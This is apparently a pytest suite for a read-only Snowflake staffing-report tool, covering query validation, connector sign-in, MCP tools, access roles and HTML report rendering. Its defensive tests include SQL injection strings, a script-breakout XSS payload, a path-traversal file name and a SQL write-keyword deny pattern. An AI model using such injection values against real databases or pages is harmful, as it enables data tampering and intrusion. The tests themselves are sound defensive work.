# ruff: noqa: E501  -- fixtures and page snippets, one case to a line
"""The Snowflake reports: predefined queries only, the same SQL on both sources, pages that stand alone and say when
their data is made up. The demo database runs every statement for real; the connector runs against a stand-in module."""

from __future__ import annotations

import csv
import hashlib
import io
import json
import random
import re
import shutil
import stat
import sys
import types
from datetime import date
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "scripts"))
sys.path.insert(0, str(ROOT / "scripts" / "teams_agent"))

import ai  # noqa: E402
import roles  # noqa: E402
from snowflake_bob import backends, build_samples, demo_data, mcp_server, page, queries, reports, uk_map  # noqa: E402

DAY = demo_data.LAST_DAY.isoformat()
SITE, QUEUE, GROUP = build_samples.SITE, build_samples.QUEUE, build_samples.GROUP
PARAMS = {"site_card": {"site": SITE}, "site_pulse": {"site": SITE, "start": "2026-10-01", "end": DAY}, "queue_card": {"queue": QUEUE},
          "pulse_lines": {"day": DAY, "other_day": "2026-10-30"}, "pulse_plans": {"day": DAY, "other_day": "2026-10-30"},
          "pulse_queues": {"day": DAY, "other_day": "2026-10-30"}, "pulse_key": {"day": DAY, "other_day": "2026-10-30"},
          "panorama_days": {"queue": QUEUE, "start": "2026-10-01", "end": DAY}, "panorama_plans": {"queue": QUEUE, "start": "2026-10-01", "end": DAY},
          "forecast_rows": {"site": SITE, "group": GROUP, "start": "2026-10-01", "end": DAY},
          "latest_day": {"today": "2026-11-07"}, "groups": {}}


@pytest.fixture(scope="module")
def backend():
    return backends.DemoBackend()


@pytest.fixture(scope="module")
def samples():
    return build_samples.files()


# --- queries -----------------------------------------------------------------------------------------------------------


def test_every_query_is_covered_here_and_returns_rows(backend):
    assert set(PARAMS) == set(queries.QUERIES)
    for query_id, params in PARAMS.items():
        assert backend.run(query_id, params), query_id


@pytest.mark.parametrize("query_id", sorted(queries.QUERIES))
def test_every_query_is_one_read_only_select(query_id):
    text = queries.QUERIES[query_id].strip()
    assert text.upper().startswith("SELECT")
    assert ";" not in text
    assert not re.search(r"\b(INSERT|UPDATE|DELETE|MERGE|DROP|CREATE|ALTER|TRUNCATE|GRANT|CALL|COPY|PUT)\b", text, re.I)


def test_no_tool_takes_sql():
    """The model picks a report and its values: no tool has a parameter a statement could travel in."""
    tools = mcp_server.mcp._tool_manager.list_tools()
    assert {t.name for t in tools} == {"report_status", "report_morning_pulse",
                                       "report_network_panorama", "report_forecast_vs_actual"}
    args = {a for t in tools for a in t.parameters.get("properties", {})}
    assert args == {"day", "site", "queue", "days", "end", "group", "start"}


@pytest.mark.parametrize(("name", "value"), [
    ("site", "S1'; DROP TABLE SITES; --"), ("site", ""), ("site", "S1042\n"[:-1] + " OR 1=1"), ("queue", "12a"), ("queue", "١٢٣"), ("queue", "1" * 19),
    ("group", "Billing' OR '1'='1"), ("group", "a" * 41), ("day", "yesterday"), ("day", "2026-13-40"), ("start", "2026-01-01; DROP")])
def test_a_badly_shaped_value_is_refused_and_not_echoed(name, value):
    with pytest.raises(queries.BadParameter) as err:
        queries.CHECKS[name](value)
    if value:
        assert value not in str(err.value)


def test_a_value_with_a_trailing_newline_is_normalised_never_passed_on():
    assert queries.CHECKS["queue"]("123\n") == "123"


def test_validate_refuses_missing_and_extra_parameters():
    with pytest.raises(queries.BadParameter):
        queries.validate("queue_card", {})
    with pytest.raises(queries.BadParameter):
        queries.validate("queue_card", {"queue": "1", "site": "S1"})


def test_a_schema_is_a_plain_dotted_name():
    assert queries.schema_prefix(None) == "DEMO.STAFFING."
    assert queries.schema_prefix("SALES.PUBLIC") == "SALES.PUBLIC."
    for bad in ("A.B.C", "A; DROP", "A B", "A.B--"):
        with pytest.raises(queries.BadParameter):
            queries.schema_prefix(bad)


def test_the_sql_for_snowsight_has_its_values_written_in_and_the_schema_named():
    text = queries.render_sql("forecast_rows", PARAMS["forecast_rows"], "DEMO.STAFFING.")
    assert f"SITE_ID = '{SITE}'" in text and f"QUEUE_GROUP = '{GROUP}'" in text and "DEMO.STAFFING.DAILY" in text
    assert not re.search(r":[a-z_]+\b", text.replace(f"'{DAY}'", "")) and text.endswith(";")


def test_the_sql_runs_as_written_once_the_prefix_is_gone(backend):
    """What an analyst pastes returns the same rows the report used."""
    for query_id, params in PARAMS.items():
        text = queries.render_sql(query_id, params, "").rstrip(";")
        con = demo_data.database()
        cur = con.execute(text)
        assert len(cur.fetchall()) == len(backend.run(query_id, params)), query_id


# --- connector ---------------------------------------------------------------------------------------------------------


class _FakeCursor:
    def __init__(self, conn):
        self.conn, self.closed = conn, False

    def execute(self, text, params):
        self.conn.executed.append((text, params))
        if self.conn.fail:
            raise RuntimeError(f"secret detail {params}")

    def fetchmany(self, n):
        self.conn.limit = n
        return [{"BIZ_DAY": date(2026, 11, 6), "lower_name": __import__("decimal").Decimal("1.5")}]

    def close(self):
        self.closed = True


class _FakeConn:
    def __init__(self, fail=False):
        self.executed, self.fail, self.closed, self.cursors = [], fail, False, []

    def cursor(self, kind):
        assert kind == "dict-cursor"
        self.cursors.append(_FakeCursor(self))
        return self.cursors[-1]

    def close(self):
        self.closed = True


class _FakeModule:
    DictCursor = "dict-cursor"

    def __init__(self, conn=None, refuse=False):
        self.conn, self.refuse, self.args = conn or _FakeConn(), refuse, None

    def connect(self, **kw):
        self.args = kw
        if self.refuse:
            raise RuntimeError("password rejected for user x")
        return self.conn


def _connector(module, **cfg):
    return backends.ConnectorBackend(backends.ConnectorConfig(account="acct", user="me", **cfg), connector=module)


def test_connector_binds_values_and_normalises_rows():
    mod = _FakeModule()
    rows = _connector(mod).run("queue_card", {"queue": QUEUE})
    text, params = mod.conn.executed[0]
    assert "%(queue)s" in text and QUEUE not in text and "DEMO.STAFFING.QUEUES" in text and params == {"queue": QUEUE}
    assert rows == [{"BIZ_DAY": "2026-11-06", "LOWER_NAME": 1.5}]
    assert mod.conn.limit == backends.MAX_ROWS + 1 and mod.conn.cursors[0].closed


def test_connector_sign_in_is_sso_by_default_and_never_a_password():
    mod = _FakeModule()
    _connector(mod, role="READER", warehouse="WH").run("queue_card", {"queue": QUEUE})
    assert mod.args["authenticator"] == "externalbrowser" and mod.args["role"] == "READER" and mod.args["warehouse"] == "WH"
    assert "password" not in mod.args
    assert mod.args["session_parameters"]["STATEMENT_TIMEOUT_IN_SECONDS"] == backends.STATEMENT_TIMEOUT_S


def test_connector_key_pair_replaces_the_browser():
    args = backends.ConnectorConfig(account="a", user="u", private_key_file="/k.p8").connect_args()
    assert args["private_key_file"] == "/k.p8" and "authenticator" not in args


def test_connector_errors_name_the_step_and_carry_no_detail():
    with pytest.raises(backends.BackendError) as err:
        _connector(_FakeModule(refuse=True)).run("queue_card", {"queue": QUEUE})
    assert "sign-in failed" in str(err.value) and "password" not in str(err.value)
    mod = _FakeModule(_FakeConn(fail=True))
    with pytest.raises(backends.BackendError) as err:
        _connector(mod).run("queue_card", {"queue": QUEUE})
    assert "queue_card failed" in str(err.value) and "secret" not in str(err.value) and QUEUE not in str(err.value)
    assert mod.conn.cursors[0].closed


def test_connector_refuses_a_bad_value_before_it_connects():
    mod = _FakeModule()
    with pytest.raises(queries.BadParameter):
        _connector(mod).run("queue_card", {"queue": "1 OR 1=1"})
    assert mod.args is None


def test_connector_missing_says_how_to_install(monkeypatch):
    monkeypatch.setitem(sys.modules, "snowflake.connector", None)
    backend_ = backends.ConnectorBackend(backends.ConnectorConfig(account="a", user="u"))
    with pytest.raises(backends.BackendError, match="requirements-snowflake"):
        backend_.run("queue_card", {"queue": QUEUE})


def test_the_requirements_file_is_optional_and_named():
    assert "snowflake-connector-python" in (ROOT / "requirements-snowflake.txt").read_text(encoding="utf-8")
    assert "snowflake" not in (ROOT / "requirements.txt").read_text(encoding="utf-8")


def test_which_source():
    assert backends.from_env({}).is_demo
    assert backends.from_env({"SNOWFLAKE_BACKEND": "demo", "SNOWFLAKE_ACCOUNT": "a"}).is_demo
    real = backends.from_env({"SNOWFLAKE_ACCOUNT": "a", "SNOWFLAKE_USER": "u", "SNOWFLAKE_SCHEMA": "S.T"})
    assert not real.is_demo and real.prefix == "S.T."
    with pytest.raises(backends.BackendError, match="SNOWFLAKE_USER"):
        backends.from_env({"SNOWFLAKE_ACCOUNT": "a"})
    with pytest.raises(backends.BackendError, match="demo or connector"):
        backends.from_env({"SNOWFLAKE_BACKEND": "sqlite"})


def test_placeholder_conversion_leaves_nothing_named_and_doubles_percent():
    assert backends.connector_sql("a = :day AND b LIKE '5%'") == "a = %(day)s AND b LIKE '5%%'"


# --- the data set ------------------------------------------------------------------------------------------------------


def test_the_data_is_the_same_every_time():
    a, b = demo_data.generate(), demo_data.generate()
    assert a["PLAN_LINES"][:500] == b["PLAN_LINES"][:500] and len(a["DAILY"]) == len(b["DAILY"])


def test_the_data_has_no_real_shaped_identifiers():
    data = demo_data.generate()
    assert all(re.fullmatch(r"S\d{4}", r["SITE_ID"]) for r in data["SITES"])
    assert all(re.fullmatch(r"\d{4}", r["QUEUE_ID"]) for r in data["QUEUES"])
    assert all(r["TEAM_LEAD_EMAIL"].endswith("@example.com") for r in data["SITES"])
    assert {r["PLANNER"] for r in data["SITES"]} == {"Priya Shah", "Tom Becker"}
    assert all(re.fullmatch(r"Person \d{2}", r["TEAM_LEAD"]) for r in data["SITES"])


def test_the_export_loads_into_a_warehouse_as_csv_and_ddl(tmp_path):
    written = {p.name for p in demo_data.export(tmp_path)}
    assert written == {f"{t}.csv" for t in demo_data.TABLES} | {"create-tables.sql"}
    ddl = (tmp_path / "create-tables.sql").read_text(encoding="utf-8")
    assert "CREATE OR REPLACE TABLE DEMO.STAFFING.PLAN_LINES" in ddl
    with (tmp_path / "QUEUES.csv").open(encoding="utf-8") as fh:
        assert next(csv.reader(fh)) == list(demo_data.TABLES["QUEUES"])


# --- reports -----------------------------------------------------------------------------------------------------------


def _data(html_text: str) -> dict:
    return json.loads(re.search(r'<script type="application/json" id="data">(.*?)</script>', html_text, re.S).group(1))


@pytest.mark.parametrize("kind", sorted(reports.KINDS))
def test_a_demo_report_says_so_and_a_real_one_does_not(backend, kind):
    params = build_samples.SAMPLES[kind]
    assert page.DEMO_CHIP in reports.build(kind, backend, **params).html

    class Real:
        is_demo, prefix = False, "DEMO.STAFFING."

        def run(self, query_id, p):
            return backend.run(query_id, p)
    report = reports.build(kind, Real(), **params)
    assert page.DEMO_CHIP not in report.html and "made-up" not in report.sql.lower()
    report.paths = {"html": Path("x.html")}
    assert not reports.answer(report).startswith("DEMO")


def test_the_answer_flags_demo_data(backend):
    report = reports.build("morning-pulse", backend, day=DAY)
    assert reports.answer(report).startswith("DEMO:")


def test_morning_pulse_numbers_add_up_from_the_rows(backend):
    report = reports.build("morning-pulse", backend, day=DAY)
    d = _data(report.html)["main"]
    rows = [r for r in backend.run("pulse_lines", PARAMS["pulse_lines"]) if r["BIZ_DAY"] == DAY and r["OUTCOME"] != "skipped"]
    total = sum(r["LINES"] for r in rows)
    accepted = sum(r["LINES"] for r in rows if r["OUTCOME"] == "accepted")
    assert d["cells"][0]["v"] == f"{accepted / total * 100:.1f}%"
    assert round(sum(s["v"] for s in d["bar"])) == 100
    assert accepted and f"{accepted / total * 100:.1f}% accepted as is" in report.summary


@pytest.mark.parametrize(("kind", "params", "said"), [
    ("network-panorama", {"queue": "1", "end": DAY, "days": 30}, "no such queue"),
    ("forecast-vs-actual", {"site": "S9", "group": GROUP, "start": "2026-10-01", "end": DAY}, "no such site"),
    ("forecast-vs-actual", {"site": SITE, "group": "Nope", "start": "2026-10-01", "end": DAY}, "the groups are"),
    ("forecast-vs-actual", {"site": SITE, "group": GROUP, "start": DAY, "end": "2026-10-01"}, "after the end")])
def test_a_wrong_request_is_refused_rather_than_diagnosed(backend, kind, params, said):
    with pytest.raises(queries.BadParameter, match=said):
        reports.build(kind, backend, **params)


def test_network_panorama_totals_match_the_rows(backend):
    w = reports.build("network-panorama", backend, queue=QUEUE, end=DAY, days=45)
    d = _data(w.html)
    rows = backend.run("panorama_days", {"queue": QUEUE, "start": "2026-09-23", "end": DAY})
    assert len(d["days"]) == len(rows) == 45
    assert sum(x["v"]["handled"] for x in d["days"]) == sum(r["HANDLED"] for r in rows)


def test_forecast_vs_actual_deviation_matches_the_rows(backend):
    report = reports.build("forecast-vs-actual", backend, site=SITE, group=GROUP, start="2026-09-08", end=DAY)
    rows = backend.run("forecast_rows", {"site": SITE, "group": GROUP, "start": "2026-09-08", "end": DAY})
    fc, handled = sum(r["FORECAST_FULL_DAY"] for r in rows), sum(r["HANDLED"] for r in rows)
    kpi = next(k for k in _data(report.html)["kpis"] if k["t"] == "Forecast deviation")
    assert kpi["v"] == f"{round((fc - handled) / handled * 100):+d}%"


def test_a_data_value_cannot_break_out_of_the_page():
    text = page.page("t", "", {"x": "</script><script>alert(1)</script><!--"}, "")
    assert "</script><script>alert" not in text and "\\u003c/script>" in text
    assert page.esc("<b>") == "&lt;b&gt;"
    hero = page.hero("<img src=x>", product="morning-pulse", eyebrow="<e>", lead="<l>", chips=("<c>",))
    assert "<img src=x>" not in hero and "<e>" not in hero and "<l>" not in hero and "<c>" not in hero


def test_the_file_name_cannot_leave_the_folder():
    assert page.file_stem("network-panorama", ["../../etc", "a/b"]) == "network-panorama_etc_a-b"


def test_a_bad_date_is_refused_before_anything_runs(backend):
    for kind, kw in (("morning-pulse", {"day": "nope"}), ("forecast-vs-actual", {"site": SITE, "group": GROUP, "start": "2026-99-01", "end": DAY}),
                     ("network-panorama", {"queue": QUEUE, "end": "x", "days": 7})):
        with pytest.raises(queries.BadParameter):
            reports.build(kind, backend, **kw)


# --- files and delivery ------------------------------------------------------------------------------------------------


def test_saved_files_are_owner_only_and_sorted_by_time(backend, tmp_path):
    report = reports.build("morning-pulse", backend, day=DAY)
    paths = reports.save(report, tmp_path / "r", now=__import__("datetime").datetime(2026, 11, 7, 7, 30, 1))
    assert set(paths) == {"html", "sql", "csv"}
    for p in paths.values():
        assert p.name.startswith("20261107-073001_morning-pulse_")
        assert stat.S_IMODE(p.stat().st_mode) == 0o600
    assert stat.S_IMODE((tmp_path / "r").stat().st_mode) == 0o700
    assert next(csv.reader(io.StringIO(paths["csv"].read_text(encoding="utf-8"))))[0] == "BIZ_DAY"


def test_reports_folder_is_ignored_by_git():
    assert "user-data" in str(reports.REPORT_DIR)
    assert "user-data/x.json" in (ROOT / "tests" / "test_no_private_data.py").read_text(encoding="utf-8")


def test_delivery_uses_the_viewer_link_for_the_page_only(backend, tmp_path):
    report = reports.build("morning-pulse", backend, day=DAY)
    reports.save(report, tmp_path)
    sent = []
    links = reports.deliver(report, upload=lambda p: sent.append(p.suffix) or f"https://contoso.sharepoint.com/f/{p.name}",
                            env={"SHAREPOINT_UPLOAD_FOLDER_URL": "https://contoso.sharepoint.com/f"})
    assert sent == [".html", ".sql", ".csv"]
    assert links["html"].endswith(".html?web=1") and "web=1" not in links["sql"] and "web=1" not in links["csv"]
    text = reports.answer(report)
    assert f"[Morning Pulse]({links['html']})" in text and links["sql"] in text


def test_delivery_without_a_folder_keeps_the_file_local_and_says_so(backend, tmp_path):
    report = reports.build("morning-pulse", backend, day=DAY)
    reports.save(report, tmp_path)
    called = []
    assert reports.deliver(report, upload=called.append, env={}) == {} and not called
    assert "saved on the owner's machine" in reports.answer(report)


def test_a_failed_upload_does_not_lose_the_report(backend, tmp_path):
    report = reports.build("morning-pulse", backend, day=DAY)
    reports.save(report, tmp_path)

    def boom(_path):
        raise OSError("network")
    assert reports.deliver(report, upload=boom, env={"SHAREPOINT_UPLOAD_FOLDER_URL": "https://x"}) == {}
    assert report.paths["html"].is_file() and "saved on the owner's machine" in reports.answer(report)


# --- the tools ---------------------------------------------------------------------------------------------------------


@pytest.fixture
def tool_env(monkeypatch, tmp_path, backend):
    monkeypatch.setattr(mcp_server, "_backend", lambda: backend)
    monkeypatch.setattr(backends, "settings", lambda: {"BOB_REPORT_DIR": str(tmp_path)})
    return tmp_path


def test_each_tool_builds_a_report(tool_env):
    for text in (mcp_server.report_morning_pulse(), mcp_server.report_network_panorama(QUEUE),
                 mcp_server.report_forecast_vs_actual(SITE, GROUP)):
        assert text.startswith("DEMO:") and "saved on the owner's machine" in text
    assert len(list(tool_env.glob("*.html"))) == 3


def test_tools_turn_bad_input_and_source_failures_into_a_clear_error(tool_env, monkeypatch):
    assert mcp_server.report_forecast_vs_actual("bad site!", GROUP).startswith("ERROR: site")
    assert mcp_server.report_forecast_vs_actual(SITE, GROUP, end="nope").startswith("ERROR: start, end")
    assert mcp_server.report_morning_pulse("nope").startswith("ERROR: day")
    assert list(tool_env.glob("*")) == []

    class Broken:
        is_demo, prefix = False, "X."

        def run(self, *_a):
            raise backends.BackendError("sign-in failed: Boom")

        def close(self):
            pass
    monkeypatch.setattr(mcp_server, "_backend", lambda: Broken())
    assert mcp_server.report_morning_pulse().startswith("ERROR: Snowflake: sign-in failed")
    monkeypatch.setattr(mcp_server, "_backend", lambda: (_ for _ in ()).throw(backends.BackendError("not configured")))
    for text in (mcp_server.report_status(), mcp_server.report_morning_pulse(),
                 mcp_server.report_network_panorama(QUEUE), mcp_server.report_forecast_vs_actual(SITE, GROUP)):
        assert text == "ERROR: Snowflake: not configured"


def test_panorama_days_are_clamped(tool_env):
    assert mcp_server.report_network_panorama(QUEUE, days=9999).startswith("DEMO:")
    assert any("network-panorama" in p.name and p.name.endswith("_60.html") for p in tool_env.glob("*.html"))


def test_status_names_the_source(tool_env, monkeypatch):
    assert mcp_server.report_status().startswith("DEMO:")
    monkeypatch.setattr(mcp_server, "_backend", lambda: backends.ConnectorBackend(backends.ConnectorConfig(account="acct", user="u")))
    assert mcp_server.report_status() == "Snowflake: schema DEMO.STAFFING."


# --- who may use them --------------------------------------------------------------------------------------------------


def test_the_group_is_opt_in_so_a_default_chat_does_not_get_it():
    assert "snowflake" in ai._OPT_IN_GROUPS and "snowflake" not in ai._ALL_GROUPS
    assert "snowflake-bob" not in ai._ALLOWED_TOOLS


def test_the_example_role_is_team_only_and_never_reaches_a_chat_with_outsiders():
    doc = json.loads((ROOT / "roles.example.json").read_text(encoding="utf-8"))
    assert "snowflake" in roles.team_only(doc)
    known, default = list(ai._MCP_GROUPS), list(ai._ALL_GROUPS)
    team = roles.effective_groups({"roles": ["data_analyst"]}, doc, default, known)
    assert team == ["jira", "datetime", "snowflake"]
    outside = roles.effective_groups({"roles": ["data_analyst"], "external_chat": True, "add_groups": ["snowflake"]}, doc, default, known)
    assert "snowflake" not in outside
    everyone = roles.effective_groups({"roles": ["assistant"]}, doc, default, known)
    assert "snowflake" not in (everyone or default)


def test_the_prompt_forbids_writing_sql_and_posting_to_tickets():
    text = (ROOT / "scripts" / "teams_agent" / "prompts" / "bob_tools_snowflake.md").read_text(encoding="utf-8")
    for needle in ("DEMO:", "You do not write SQL", "You never comment on the ticket yourself"):
        assert needle in text


def test_the_scheduled_example_uses_the_group_and_stays_off():
    jobs = json.loads((ROOT / "scripts" / "broadcast" / "jobs.example.json").read_text(encoding="utf-8"))
    job = next(j for j in jobs if j["id"] == "morning-pulse")
    assert job["tools"] == ["snowflake"] and job["enabled"] is False and "report_morning_pulse" in job["prompt"]
    schedule = json.loads((ROOT / "scripts" / "broadcast" / "broadcast-schedule.example.json").read_text(encoding="utf-8"))
    assert schedule["morning-pulse"] == {"generate_send": "07:30"}


# --- the published samples ---------------------------------------------------------------------------------------------


def test_the_committed_samples_are_exactly_what_the_generator_writes(samples):
    folder = ROOT / "docs" / "reports"
    assert {p.name for p in folder.iterdir()} == set(samples)
    for name, text in samples.items():
        assert (folder / name).read_text(encoding="utf-8") == text, f"{name}: run build_samples.py"


@pytest.mark.parametrize("name", ["morning-pulse.html", "network-panorama.html", "forecast-vs-actual.html"])
def test_a_sample_page_stands_alone(samples, name):
    text = samples[name]
    assert page.DEMO_CHIP in text
    assert "data:" not in text and "base64" not in text, "no embedded blobs: a blob hides from the private-data guard"
    assert not re.search(r"<(img|iframe|link|object|embed)\b", text), "no element that could load something"
    assert not re.search(r"<script[^>]+src=", text) and "@import" not in text and "fetch(" not in text and "XMLHttpRequest" not in text
    assert not re.search(r"https?://(?!www\.w3\.org)", text), "no outside address"
    assert re.search(r'<html lang="en">', text)
    assert not re.search(r"[ąćęłńśźż]", text, re.I), "every word on a sample is English"


# Words the sample pages must not drift into, kept as hashes so this file does not advertise them.
_OFF_TOPIC_WORDS = frozenset((
    "068b7e6c97f2284a", "08c4242b5f585628", "0a3e27b8ca818264", "1778c2d9b45bac0a", "1c168adb00d208e4", "352b84777d8dd96a",
    "3eeb7e96e59ce40f", "3eefa42d52064c48", "4a33eacd5fa65f2b", "4e7cf3cf5960fe13", "5f3c4f8580d392e4", "7fdbf2f7e97fe77a",
    "824d80d71985f082", "a6fffccf2d95e20b", "a8792157cb4f27fb", "b4af39d5b65a1484", "bbfcd4160a1e8674", "c981a30c0e7b420b",
    "cc71a31a582d0c02", "d2504e52b8b07484", "e04eb29020eaa961", "f1e01fc81a344868", "f69b1725bd4af324", "f99033a457be7501",
))
_OFF_TOPIC_STEMS = frozenset((
    "291218c9a0b2fa0b", "3534fe483de175f0", "be34563c1050a3b5", "c0fc994c04ae7565", "df94e1d62e238b39",
))


def _word_hash(word: str) -> str:
    return hashlib.sha256(word.encode()).hexdigest()[:16]


def _off_topic(text: str, words=_OFF_TOPIC_WORDS, stems=_OFF_TOPIC_STEMS) -> list[str]:
    tokens = set(re.findall(r"[a-z-]+", text.lower()))
    return sorted(tok for tok in tokens
                  if _word_hash(tok) in words or any(_word_hash(tok[:n]) in stems for n in range(5, 10)))


def test_the_off_topic_check_catches_a_word_and_a_stem():
    words, stems = {_word_hash("zebra")}, {_word_hash("giraf")}
    assert _off_topic("A Zebra, a giraffes-only pen, a lion", words, stems) == ["giraffes-only", "zebra"]
    assert _off_topic("a lion", words, stems) == []


def test_the_samples_stay_on_the_staffing_example(samples):
    """SQL keywords and the page's own styles and scripts are not the text this is about."""
    for name, text in samples.items():
        words_on_page = re.sub(r"ORDER BY|CASE WHEN|<style>.*?</style>|<script>.*?</script>", "", text, flags=re.S)
        data = _data(text) if name.endswith(".html") and name != "index.html" else {}
        found = _off_topic(words_on_page) + _off_topic(json.dumps(data, ensure_ascii=False))
        assert not found, f"{name}: {found}"


def test_a_chart_panel_never_mixes_agents_with_contacts():
    """Agents and contacts differ by a factor of ten or more: on one axis the smaller series would read as a flat line."""
    from snowflake_bob import report_panorama
    views = report_panorama.SCRIPT[report_panorama.SCRIPT.index("const VIEWS"):report_panorama.SCRIPT.index("let view")]
    for panel in re.findall(r"\{title: .*?\]\}", views, re.S):
        keys = set(re.findall(r"k: '(\w+)'", panel))
        assert not (keys & {"sug", "appr", "sug_site", "appr_site", "rostered_site", "avg_sug", "avg_appr"} and keys & {"handled", "fc", "handled_site"}), panel


def test_handled_contacts_never_exceed_what_the_agents_could_take():
    data = demo_data.generate()
    per_agent = {name: row[3] for group in demo_data.CATALOG for row in group[2] for name in [row[0]]}
    names = {q["QUEUE_ID"]: q["NAME"] for q in data["QUEUES"]}
    for row in data["DAILY"][:5000]:
        agents = row["ROSTERED_AM"] + row["JOINING"] - row["ABSENT"]
        assert row["HANDLED"] <= agents * per_agent[names[row["QUEUE_ID"]]] * demo_data.STRETCH + 1


@pytest.mark.skipif(shutil.which("git") is None, reason="git not available")
def test_the_samples_folder_is_not_ignored():
    import subprocess
    out = subprocess.run(["git", "-C", str(ROOT), "check-ignore", "docs/reports/morning-pulse.html"], capture_output=True, text=True)
    assert out.returncode == 1


# --- the site card's map, and the stylesheet's property names ----------------------------------------------------------


def test_every_demo_city_lands_on_the_uk_map():
    dots = uk_map.land_dots()
    assert 150 < len(dots) < 900
    for city, _region, lat, lon in demo_data.CITIES:
        cx, cy = uk_map.project(lat, lon)
        near = min((x - cx) ** 2 + (y - cy) ** 2 for x, y in dots) ** .5
        assert near <= uk_map.STEP * 1.5, city


def test_the_sample_site_has_coordinates_in_its_own_city():
    rows = demo_data._sites(random.Random(demo_data.SEED))  # noqa: S311 -- the demo's own seeded generator
    places = {city: (region, lat, lon) for city, region, lat, lon in demo_data.CITIES}
    for row in rows:
        region, lat, lon = places[row["CITY"]]
        assert row["REGION"] == region
        assert abs(row["LAT"] - lat) <= .05 and abs(row["LON"] - lon) <= .05
    assert "Leeds" in (ROOT / "docs" / "reports" / "forecast-vs-actual.html").read_text(encoding="utf-8")


@pytest.mark.parametrize(("lat", "lon"), [(None, None), ("53.8", -1.55), (52.23, 21.01), (.5, .5)])
def test_a_site_without_uk_coordinates_gets_no_map(lat, lon):
    assert uk_map.svg(lat, lon, "Elsewhere", "big") == ""


def test_the_map_names_the_city_safely_and_only_at_full_size():
    big, mini = uk_map.svg(53.8, -1.55, 'Le"<eds', "big"), uk_map.svg(53.8, -1.55, 'Le"<eds', "mini")
    assert "<eds" not in big and "<eds" not in mini and 'Le"' not in big
    assert "<text" in big and "<text" not in mini


def test_layout_properties_use_their_real_names():
    for path in (ROOT / "scripts" / "snowflake_bob").glob("*.py"):
        bad = re.findall(r"\b(?:align|justify|place)-(?!items|self|content)[a-z]+:", path.read_text(encoding="utf-8"))
        assert not bad, f"{path.name}: {bad}"


# --- a real browser, where one is installed ------------------------------------------------------------------------------


def _browser():
    sync_api = pytest.importorskip("playwright.sync_api")
    pw = sync_api.sync_playwright().start()
    try:
        return pw, pw.chromium.launch()
    except Exception as exc:  # noqa: BLE001 -- no browser on this machine (CI): the rest of the file still runs
        pw.stop()
        pytest.skip(f"no Chromium: {type(exc).__name__}")


@pytest.mark.parametrize("width", [1200, 390])
def test_every_sample_runs_clean_and_never_scrolls_sideways(width):
    pw, browser = _browser()
    try:
        ctx = browser.new_context(viewport={"width": width, "height": 900})
        for name in ("morning-pulse", "network-panorama", "forecast-vs-actual"):
            pg = ctx.new_page()
            errors, outside = [], []
            pg.on("pageerror", lambda exc, e=errors: e.append(str(exc)))
            pg.on("request", lambda r, o=outside: o.append(r.url) if not r.url.startswith("file:") else None)
            pg.goto((ROOT / "docs" / "reports" / f"{name}.html").as_uri())
            pg.wait_for_selector("#tip", state="attached")
            assert not errors, f"{name}: {errors}"
            assert not outside, f"{name}: {outside}"
            assert pg.evaluate("document.documentElement.scrollWidth - innerWidth") <= 0, name
            pg.close()
    finally:
        browser.close()
        pw.stop()


def test_every_style_rule_is_one_a_browser_accepts_and_the_change_pill_is_centred():
    pw, browser = _browser()
    try:
        pg = browser.new_context(viewport={"width": 1200, "height": 900}).new_page()
        pg.goto((ROOT / "docs" / "reports" / "forecast-vs-actual.html").as_uri())
        pg.wait_for_selector("#tip", state="attached")
        css = pg.evaluate("[...document.querySelectorAll('style')].map(el => el.textContent).join('')")
        props = {m for m in re.findall(r"[{;]\s*([a-z][a-z-]+)\s*:", re.sub(r"/\*.*?\*/", "", css, flags=re.S))}
        unknown = pg.evaluate("names => names.filter(name => !(name in document.body.style))", sorted(props))
        assert not unknown, unknown
        gap = pg.evaluate("""() => { const big = document.querySelector('.pulse .pv b').getBoundingClientRect();
          const chip = document.querySelector('.pulse .pd').getBoundingClientRect();
          return [Math.abs((big.top + big.bottom) / 2 - (chip.top + chip.bottom) / 2), chip.height / big.height]; }""")
        assert gap[0] <= 1 and gap[1] < .9, gap
    finally:
        browser.close()
        pw.stop()


def test_the_interactions_work_in_a_browser():
    pw, browser = _browser()
    try:
        ctx = browser.new_context(viewport={"width": 1200, "height": 900})
        doc = lambda n: (ROOT / "docs" / "reports" / f"{n}.html").as_uri()  # noqa: E731
        # Morning Pulse: the second tab, a group opening, the list search
        pg = ctx.new_page()
        pg.goto(doc("morning-pulse"))
        pg.click('#tabs button[data-k="top"]')
        assert pg.is_visible("#v-top") and not pg.is_visible("#v-net")
        pg.click('#tabs button[data-k="net"]')
        pg.click("#groups .row .l")
        assert pg.locator("#groups .row.open .prods").count() == 1
        all_rows = pg.locator("#pl-removed .it:visible").count()
        pg.fill('input[data-q="pl-removed"]', "billing")
        assert 0 < pg.locator("#pl-removed .it:visible").count() < all_rows
        # Network Panorama: a view switch redraws the legend, the day table sorts
        pg = ctx.new_page()
        pg.goto(doc("network-panorama"))
        pg.click('#view button[data-k="sites"]')
        assert "With a suggestion" in pg.inner_text("#lg")
        pg.click('#tbl button[data-k="d"]')
        first = pg.inner_text("#tab tbody tr:first-child td:first-child")
        pg.click("#tab th:first-child")
        assert pg.inner_text("#tab tbody tr:first-child td:first-child") != first
        # Forecast vs Actual: a weekday tap, a subgroup opening, the list mode
        pg = ctx.new_page()
        pg.goto(doc("forecast-vs-actual"))
        pg.click('#wd .col[data-i="0"]')
        assert "Monday" in pg.inner_text("#wd-det")
        pg.click("#grp .row .l")
        assert pg.locator("#grp .row.open .pr").count() > 0
        pg.click('#mode button[data-k="list"]')
        pg.click('#side button[data-k="all"]')
        assert pg.locator("#idx .it").count() > 0
    finally:
        browser.close()
        pw.stop()


# --- found in review --------------------------------------------------------------------------------------------------


class _RealLooking(backends.DemoBackend):
    """The demo rows, through the path a warehouse takes."""
    is_demo = False

    def __init__(self):
        super().__init__()
        self.closed = 0

    def close(self):
        self.closed += 1


def _site_report(backend):
    return reports.build("forecast-vs-actual", backend, site=SITE, group=GROUP, start="2026-09-08", end=DAY)


def test_a_real_report_leaves_named_people_off_the_page_unless_asked(monkeypatch):
    monkeypatch.setattr(backends, "settings", lambda: {})
    html = _site_report(_RealLooking()).html
    assert "Team lead" not in html and "Workforce planner" not in html and "regional director" not in html
    assert "team lead Person" not in html and "mailto:" not in html
    assert "Site phone" in html and "Address" in html

    monkeypatch.setattr(backends, "settings", lambda: {"BOB_REPORT_CONTACTS": "1"})
    html = _site_report(_RealLooking()).html
    assert "Team lead" in html and "mailto:" in html and "regional director" in html


